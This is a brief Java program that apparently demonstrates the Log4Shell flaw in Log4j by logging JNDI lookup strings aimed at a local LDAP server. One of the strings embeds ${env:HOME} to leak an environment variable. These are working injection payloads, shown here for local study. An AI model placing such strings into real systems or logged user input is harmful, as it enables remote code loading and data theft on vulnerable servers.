package de.mvitz.jndi;

import org.apache.logging.log4j.LogManager;

public class Log4Shell {

    public static void main(String[] args) {
        var logger = LogManager.getLogger(Log4Shell.class);
        logger.error("${jndi:ldap://localhost:389/cn=Person,ou=Objects,dc=mvitz,dc=de}");
        logger.error("${jndi:ldap://localhost:389/${env:HOME}}");
    }
}
